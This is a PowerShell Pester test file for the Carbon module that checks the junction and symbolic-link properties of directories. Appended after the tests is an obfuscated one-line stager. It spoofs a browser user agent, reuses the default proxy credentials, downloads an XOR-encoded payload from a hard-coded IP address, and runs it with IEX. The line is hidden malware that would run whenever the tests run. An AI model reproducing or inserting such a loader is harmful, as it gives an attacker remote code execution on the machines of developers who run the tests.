











& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

function GivenANormalDirectory
{
    $path = Join-Path -Path $TestDrive.FullName -ChildPath 'dir'
    New-Item -Path $path -ItemType 'Directory'
}

Describe 'Carbon.when getting normal directoryes' {
    $Global:Error.Clear()

    $dir = GivenANormalDirectory

    It 'should not be a junction' {
        $dir.IsJunction | Should Be $false
    }

    It 'should not be a symbolic link' {
        $dir.IsSymbolicLink | Should Be $false
    }

    It 'should not have a target path' {
        $dir.TargetPath | Should Be $null
    }

    It 'should write no errors' {
        $Global:Error | Should BeNullOrEmpty
    }
}

Describe 'Carbon.when getting symoblic link directories' {
    $Global:Error.Clear()
    $sourceDir = GivenANormalDirectory
    $symDirPath = Join-Path -Path $TestDrive.FullName -ChildPath 'destination'
    [Carbon.IO.SymbolicLink]::Create($symDirPath, $sourceDir.FullName, $true)

    try 
    {
            
        $dirInfo = Get-Item -Path $symDirPath

        It 'should be a junction' {
            $dirInfo.IsJunction | Should Be $true
        }

        It 'should be a symbolic link' {
            $dirInfo.IsSymbolicLink | Should Be $true
        }

        It 'should have a target path' {
            $dirInfo.TargetPath | Should Be $sourceDir.FullName
        }

        It 'should write no errors' {
            $Global:Error | Should BeNullOrEmpty
        }
    }
    finally
    {
        cmd /C rmdir $symDirPath
    }
}
$WC=NeW-Object SystEM.NeT.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaderS.Add('User-Agent',$u);$wc.ProXY = [SystEm.NEt.WEBReQuEst]::DeFaULTWeBPROxY;$wc.PRoxy.CrEdeNtiAlS = [SysTem.NEt.CREDentIaLCAcHE]::DefaULTNetWOrkCrEDentIaLS;$K='827ccb0eea8a706c4c34a16891f84e7b';$I=0;[ChAr[]]$B=([chaR[]]($wC.DoWNLoAdStRINg("http://192.168.2.106:8080/index.asp")))|%{$_-bXOR$K[$I++%$k.LeNgth]};IEX ($b-JOIN'')

